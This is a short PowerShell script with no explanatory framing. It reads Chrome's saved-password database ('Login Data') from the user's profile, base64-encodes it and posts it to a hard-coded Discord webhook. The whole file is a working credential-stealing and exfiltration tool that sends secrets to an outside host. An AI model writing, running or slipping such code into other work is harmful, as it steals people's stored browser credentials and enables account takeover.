# Path to file
$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Check existence, using -LiteralPath for spaces
if (-Not (Test-Path -LiteralPath $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read bytes and convert to base64 string
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$fileBase64 = [System.Convert]::ToBase64String($fileBytes)

# Truncate to 1500 chars to keep Discord happy
if ($fileBase64.Length -gt 1500) {
    $fileBase64 = $fileBase64.Substring(0,1500) + "..."
}

# Prepare JSON payload manually with proper escaping
$jsonPayload = '{"content":"Base64 of Login Data:\n```' + $fileBase64 + '```"}'

# Your webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Send to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'

Write-Host "Base64 preview sent to Discord webhook."
